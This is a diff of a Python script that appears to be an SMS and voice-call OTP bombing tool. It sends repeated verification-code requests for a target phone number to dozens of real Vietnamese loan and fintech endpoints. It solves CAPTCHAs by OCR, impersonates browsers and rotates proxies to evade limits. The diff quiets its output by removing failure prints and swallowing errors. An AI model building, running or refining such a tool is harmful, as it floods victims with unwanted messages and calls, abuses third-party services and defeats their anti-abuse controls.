@@ -195,11 +195,9 @@ async def _qq_send(phone_otp: str, endpoint: str, label: str):
                 return
             cap_b64 = (d1.get("data") or {}).get("captcha", "")
             if not cap_b64:
-                print(f" ✗ {label} {phone_otp}  code={d1.get('code')}  {d1.get('message','')}")
                 return
             answer = _qq_solve(cap_b64)
             if not answer:
-                print(f" ✗ {label} {phone_otp}  OCR failed")
                 return
             r2 = await c.post(
                 f"{_QQ_BASE}{endpoint}",
@@ -208,9 +206,10 @@ async def _qq_send(phone_otp: str, endpoint: str, label: str):
             )
             d2 = r2.json()
             ok = str(d2.get("code", "")) == "0"
-            print(f" {'✅' if ok else '✗'} {label} {phone_otp}  [{answer}]  {d2.get('message','')}")
+            if ok:
+                print(f" ✅ {label} {phone_otp}  [{answer}]  {d2.get('message','')}")
     except Exception as e:
-        print(f" ✗ {label} ERR: {str(e)[:60]}")
+        pass
 
 async def qq_sms(phone_otp: str):
     await _qq_send(phone_otp, "/base/xmh/getSMSCode", "QQ SMS")
@@ -260,11 +259,9 @@ async def _ptv_send(phone_otp: str, endpoint: str, cap_key: str, label: str):
                 return
             cap_b64 = (d1.get("data") or {}).get(cap_key, "")
             if not cap_b64:
-                print(f" ✗ {label} {phone_otp}  code={d1.get('code')}  {d1.get('message','')}")
                 return
             answer = _qq_solve(cap_b64)
             if not answer:
-                print(f" ✗ {label} {phone_otp}  OCR failed")
                 return
             r2 = await c.post(
                 f"{_PTV_BASE}{endpoint}",
@@ -273,9 +270,10 @@ async def _ptv_send(phone_otp: str, endpoint: str, cap_key: str, label: str):
             )
             d2 = r2.json()
             ok = str(d2.get("code", "")) == "0"
-            print(f" {'✅' if ok else '✗'} {label} {phone_otp}  [{answer}]  {d2.get('message','')}")
+            if ok:
+                print(f" ✅ {label} {phone_otp}  [{answer}]  {d2.get('message','')}")
     except Exception as e:
-        print(f" ✗ {label} ERR: {str(e)[:60]}")
+        pass
 
 async def ptvay_sms(phone_otp: str):
     await _ptv_send(phone_otp, "/lvjKRH/brRsY/JHkuyNids/RlhiPz", "jmJiSn2D1", "PTVay SMS")
@@ -323,11 +321,9 @@ async def _lavi_send(phone_otp: str, endpoint: str, label: str):
                 return
             cap_b64 = (d1.get("data") or {}).get("captcha", "")
             if not cap_b64:
-                print(f" ✗ {label} {phone_otp}  code={d1.get('code')}  {d1.get('message','')}")
                 return
             answer = _qq_solve(cap_b64)
             if not answer:
-                print(f" ✗ {label} {phone_otp}  OCR failed")
                 return
             r2 = await c.post(
                 f"{_LAVI_BASE}{endpoint}",
@@ -336,9 +332,10 @@ async def _lavi_send(phone_otp: str, endpoint: str, label: str):
             )
             d2 = r2.json()
             ok = str(d2.get("code", "")) == "0"
-            print(f" {'✅' if ok else '✗'} {label} {phone_otp}  [{answer}]  {d2.get('message','')}")
+            if ok:
+                print(f" ✅ {label} {phone_otp}  [{answer}]  {d2.get('message','')}")
     except Exception as e:
-        print(f" ✗ {label} ERR: {str(e)[:60]}")
+        pass
 
 async def lavi_sms(phone_otp: str):
     await _lavi_send(phone_otp, "/base/xmh/getSMSCode", "Lavi SMS")
@@ -387,9 +384,10 @@ async def _achau_send(phone_otp: str, endpoint: str, label: str):
             )
             d = r.json()
             ok = str(d.get("code", "")) == "0"
-            print(f" {'✅' if ok else '✗'} {label} {phone_otp}  {d.get('message', '')}")
+            if ok:
+                print(f" ✅ {label} {phone_otp}  {d.get('message', '')}")
     except Exception as e:
-        print(f" ✗ {label} ERR: {str(e)[:60]}")
+        pass
 
 async def achau_sms(phone_otp: str):
     await _achau_send(phone_otp, "/AQadQ/Jfmb/goMXd/IuGP", "AChauLoan SMS")
@@ -444,11 +442,9 @@ async def _petro_send(phone_otp: str, endpoint: str, label: str):
                 return
             cap_b64 = (d1.get("data") or {}).get("captcha", "")
             if not cap_b64:
-                print(f" ✗ {label} {phone_otp}  code={d1.get('code')}  {d1.get('message','')}")
                 return
             answer = _qq_solve(cap_b64)
             if not answer:
-                print(f" ✗ {label} {phone_otp}  OCR failed")
                 return
             r2 = await c.post(
                 f"{_PETRO_BASE}{endpoint}",
@@ -457,9 +453,10 @@ async def _petro_send(phone_otp: str, endpoint: str, label: str):
             )
             d2 = r2.json()
             ok = str(d2.get("code", "")) == "0"
-            print(f" {'✅' if ok else '✗'} {label} {phone_otp}  [{answer}]  {d2.get('message','')}")
+            if ok:
+                print(f" ✅ {label} {phone_otp}  [{answer}]  {d2.get('message','')}")
     except Exception as e:
-        print(f" ✗ {label} ERR: {str(e)[:60]}")
+        pass
 
 async def petro_sms(phone_otp: str):
     await _petro_send(phone_otp, "/base/xmh/getSMSCode", "Petro SMS")
@@ -496,12 +493,11 @@ async def vncredit_sms(phone_otp):
         if r.status_code == 200:
             resp = _vncredit_decrypt(r.json())
             ok = resp.get("code") == 0
-            print(f" {'✅' if ok else '✗'} VNCredit SMS  {resp.get('msg', '')}")
+            if ok:
+                print(f" ✅ VNCredit SMS  {resp.get('msg', '')}")
             return ok
-        print(f" ✗ VNCredit SMS HTTP {r.status_code}")
         return False
     except Exception as e:
-        print(f" ✗ VNCredit SMS ERR: {str(e)[:60]}")
         return False
 
 async def vncredit_voice(phone_otp):
@@ -515,12 +511,11 @@ async def vncredit_voice(phone_otp):
         if r.status_code == 200:
             resp = _vncredit_decrypt(r.json())
             ok = resp.get("code") == 0
-            print(f" {'✅' if ok else '✗'} VNCredit Voice  {resp.get('msg', '')}")
+            if ok:
+                print(f" ✅ VNCredit Voice  {resp.get('msg', '')}")
             return ok
-        print(f" ✗ VNCredit Voice HTTP {r.status_code}")
         return False
     except Exception as e:
-        print(f" ✗ VNCredit Voice ERR: {str(e)[:60]}")
         return False
 
 async def random_site(phone_otp):
@@ -530,7 +525,6 @@ async def random_site(phone_otp):
             headers={"Content-Type": "application/json"},
             json={"phone": phone_otp}
         )
-    print(r.status_code)
 async def call_mfast360(phone_otp):
     headers = {
         "Content-Type": "application/json",
@@ -548,7 +542,6 @@ async def call_mfast360(phone_otp):
                 json=payload,
                 headers=headers,
             )
-        print(f" Status: {r.status_code} | call ")
     except:
         pass
 
@@ -568,7 +561,6 @@ async def calll20(phone_otp):
             json={**payload, "type": 1},
             headers=headers
             )
-        print(f" Status: {res1.status_code} Thành Công Lần 1")
 
         res2 = await client.post(
                 "https://advii.artemisdongapp.com/v2/login/captcha",
@@ -576,7 +568,6 @@ async def calll20(phone_otp):
                 headers=headers
 
                )
-        print(f" Status: {res2.status_code} | call20 ")
 
 async def call2(phone_otp):
     try:
@@ -601,8 +592,6 @@ async def call2(phone_otp):
                 headers=headers,
                 json=payload_1
             )
-            print("Call2:", r1.status_code)
-            print("Call2:", r1.text)
             payload_2 = {
                 "type": 2,
                 "productName": "u_cash"
@@ -612,7 +601,6 @@ async def call2(phone_otp):
                 headers=headers,
                 json=payload_2
             )
-            print("Call2:", r2.status_code)
         return True
     except:
         return False
@@ -640,8 +628,6 @@ async def call1(phone_otp):
                 headers=headers,
                 json=payload_1
             )
-            print("Call1:", r1.status_code)
-            print("Call1:", r1.text)
             payload_2 = {
                 "type": 2,
                 "productName": "vay_home"
@@ -651,7 +637,6 @@ async def call1(phone_otp):
                 headers=headers,
                 json=payload_2
             )
-            print("Call1:", r2.status_code)
         return True
     except:
         return False
@@ -774,7 +759,6 @@ async def mfast1(phone_otp):
             headers=headers,
             data=data,
         )
-    print(r.status_code)
 
 async def combo1(phone_otp):
     headers = build_headers("https://ios-h5.sunmobilefinance.com")
@@ -792,7 +776,6 @@ async def combo1(phone_otp):
             json=payload1,
             headers=headers
         )
-    print("r1 status:", r1.status_code)
 
 async def combo2(phone_otp):
     headers = build_headers("https://ios-h5.sunmobilefinance.com")
@@ -810,7 +793,6 @@ async def combo2(phone_otp):
             headers=headers,
             json=payload
         )
-    print("r2 status:", r2.status_code)
 
 async def mfast(phone_otp):
     headers = {
@@ -832,8 +814,6 @@ async def mfast(phone_otp):
             headers=headers,
             data=data,
         )
-    print(r.status_code)
-    print(r.text)
 
 VAY_DEP365 = [
         "https://ndnndfndndbb--28fa0824520211f1b766ee650bb23af1.web.val.run",
@@ -852,7 +832,6 @@ async def call_vaydep365(phone_otp: str):
         print(f"  vaydep365_valtown | {r.status_code} | {r.text[:200]}")
         return r.json()
     except Exception as e:
-        print(f"  vaydep365_valtown | lỗi: {e}")
         return None
 
 
@@ -872,7 +851,6 @@ async def call8(phone_otp):
             json={**payload, "type": 2},
             headers=headers,
         )
-    print(f" Status: {res1.status_code} | call")
 
 async def call3(phone_otp):
     phone_formatted = phone_otp.lstrip('0')
@@ -898,7 +876,6 @@ async def call3(phone_otp):
     try:
         async with BrowserSession(impersonate=_BROWSER) as client:
             response = await client.post(url, headers=headers, data=data)
-        print(f"📡 Status: {response.status_code}")
         return False, response.text
     except:
         return False
@@ -938,7 +915,6 @@ async def call9(phone_otp):
                 headers=headers_post,
                 json={"data": {"phone": phone_otp, "code": "resend", "channel": "ivr"}},
             )
-        print(f"📡 Status Call9 : {r.status_code}")
         return r.status_code == 200
     except:
         return False
@@ -974,7 +950,6 @@ async def calll(phone_otp):
             json={**payload, "type": 2, "app_id": "247000000"},
             headers=headers,
         )
-    print(f" Status: {res2.status_code} | call")
 
 async def call_senvay(phone_otp, proxy_url):
     KEY   = b"43frgy5fmjf4647f"
@@ -1110,7 +1085,6 @@ async def call10(phone_otp):
             json={**payload, "type": 2},
             headers=headers,
         )
-    print(f" Status: {res2.status_code} | call 10")
 
 async def call11(phone_otp):
     headers = build_headers("https://ios-h5.kasikvayfinance.com")
@@ -1143,7 +1117,6 @@ async def calll11(phone_otp):
             json={**payload, "type": 2, "app_id": "233000001"},
             headers=headers,
         )
-    print(f" Status: {res2.status_code} | call 11")
 
 async def call12(phone_otp):
     headers = {
@@ -1164,7 +1137,6 @@ async def call12(phone_otp):
             json={**payload, "type": 2, "app_id": "231000001"},
             headers=headers,
         )
-    print(f" Status: {res1.status_code} | call 12")
 
 async def calll12(phone_otp):
     headers = {
@@ -1185,7 +1157,6 @@ async def calll12(phone_otp):
             json={**payload, "app_id": "231000000"},
             headers=headers,
         )
-    print(f" Status: {res2.status_code} | call 12")
 
 async def call10ok(phone_otp):
     headers1 = build_headers("https://vn-android-topqcash-net.pages.dev")
@@ -1204,7 +1175,6 @@ async def call10ok(phone_otp):
             json=payload1,
             headers=headers1
         )
-    print("r1 status:", r1.status_code)
 
 async def calll10ok(phone_otp):
     headers2 = build_headers("https://iosweb.topqcash.net/#/login")
@@ -1223,7 +1193,6 @@ async def calll10ok(phone_otp):
             headers=headers2,
             json=payload2
         )
-    print("r2 status:", r2.status_code)
 
 async def call11ok(phone_otp):
     headers = build_headers("https://android.umoneynv.net")
@@ -1241,7 +1210,6 @@ async def call11ok(phone_otp):
             json={**payload, "type": 2, "app_id": "2700000000"},
             headers=headers,
         )
-    print(f" Status: {res1.status_code} | call 11ok")
 
 async def calll11ok(phone_otp):
     headers = build_headers("https://android.umoneynv.net")
@@ -1259,7 +1227,6 @@ async def calll11ok(phone_otp):
             json={**payload, "type": 2, "app_id": "2700000001"},
             headers=headers,
         )
-    print(f" Status: {res2.status_code} | call 11ok")
 
 async def call12ok(phone_otp):
     headers = build_headers("https://android-h5.truongtaionline.com")
@@ -1282,7 +1249,6 @@ async def call12ok(phone_otp):
             json={**payload, "type": 2},
             headers=headers,
         )
-    print(f" Status: {res2.status_code} | call 12ok")
 
 async def call13ok(phone_otp):
     headers = build_headers("https://android-h5.dhloantrading.com")
@@ -1304,7 +1270,6 @@ async def call13ok(phone_otp):
             json={**payload, "type": 2, "app_id": "243000001"},
             headers=headers,
         )
-    print(f" Status: {res2.status_code} | call 13ok")
 
 
 async def call28(phone_otp):
@@ -1346,7 +1311,6 @@ async def calll28(phone_otp):
             json={**payload, "type": 2, "app_id": "260000001"},
             headers=headers,
         )
-    print(f" Status: {res2.status_code} | call 28")
 
 
 async def call14ok(phone_otp):
@@ -1382,7 +1346,6 @@ async def calll14ok(phone_otp):
             json={**payload, "type": 2},
             headers=headers,
         )
-    print(f" Status: {res2.status_code} | call 14")
 
 
 async def call17(phone_otp):
@@ -1418,7 +1381,6 @@ async def calll17(phone_otp):
             json={**payload, "type": 2},
             headers=headers,
         )
-    print(f" Status: {res2.status_code} | call 17")
 
 async def call18(phone_otp):
     headers = build_headers("https://vn-android-gbcreditvn-net.pages.dev")
@@ -1455,7 +1417,6 @@ async def calll18(phone_otp):
             json={**payload, "type": 2},
             headers=headers,
         )
-    print(f" Status: {res2.status_code} | call 18")
 
 async def call19(phone_otp):
     headers = build_headers("https://bsawv.subkamolplus.com")
@@ -1477,7 +1438,6 @@ async def calll19(phone_otp):
         headers=headers
         )
 
-    print(f" Status: {res2.status_code} | call 19")
 
 async def call21(phone_otp):
     headers = build_headers("https://vn-android-h5-nathco-vay.pages.dev")
@@ -1510,7 +1470,6 @@ async def calll21(phone_otp):
             json={**payload, "type": 2, "app_id": "235000001"},
             headers=headers,
         )
-    print(f" Status: {res2.status_code} | call 21")
 
 async def call22(phone_otp):
     headers = {
@@ -1539,7 +1498,6 @@ async def call22(phone_otp):
         json=payload,
         headers=headers,
     )
-    print(f" Status: {res1.status_code} | call 22")
 
 async def calll22(phone_otp):
     headers = build_headers("http://d3pnx0g52v0o6y.cloudfront.net")
@@ -1558,7 +1516,6 @@ async def calll22(phone_otp):
             json={**payload, "type": 2},
             headers=headers,
         )
-    print(f" Status: {res2.status_code} | call 22")
 
 
 def _make_android_ua_headers() -> Dict[str, str]:
@@ -1597,7 +1554,6 @@ async def call101(phone_otp):
             json=payload,
             headers=headers,
         )
-    print(f" Status: {res2.status_code} | call 101")
 
 async def call_subkamol(phone_otp):
     headers = build_headers("https://android-h5.subkamolplus.com")
@@ -1605,7 +1561,6 @@ async def call_subkamol(phone_otp):
     try:
         async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
             r = await client.post("https://bsaiv.subkamolplus.com/v2/login/captcha", json=payload, headers=headers)
-        print(f" Status: {r.status_code} ")
     except:
         pass
 
@@ -1615,7 +1570,6 @@ async def calll_subkamol(phone_otp):
     try:
         async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
             r = await client.post("https://bsiiv.subkamolplus.com/v2/login/captcha", json=payload, headers=headers)
-        print(f" Status: {r.status_code} ")
     except:
         pass
 
@@ -1625,7 +1579,6 @@ async def call_mydong(phone_otp):
     try:
         async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
             r = await client.post("https://notice.mydonny.net/v2/login/captcha", json=payload, headers=headers)
-        print(f" Status: {r.status_code} ")
     except:
         pass
 
@@ -1635,7 +1588,6 @@ async def calll_mydong(phone_otp):
     try:
         async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
             r = await client.post("https://api.mydonny.net/v2/login/captcha", json=payload, headers=headers)
-        print(f" Status: {r.status_code} ")
     except:
         pass
 
@@ -1659,7 +1611,7 @@ def run_all_round_robin(sync_funcs, proxy_funcs, phone_otps, proxies, workers=10
             try:
                 func(phone_otp)
             except Exception as e:
-                print(f"  [!] {fname}({phone_otp}) lỗi: {e}")
+                pass
 
 def load_proxies():
     if not os.path.exists("proxy.txt"):
@@ -1738,7 +1690,7 @@ async def main():
         # (proxy(vuiapp),    proxy_sleep),        
         # (calll20,          10),
         # (mfast,            0),
-          (call101,          0,        
+          (call101,          0),
         # (call3,            0),
         # (call10ok,         10),
         # (ptvay_sms,        10),        
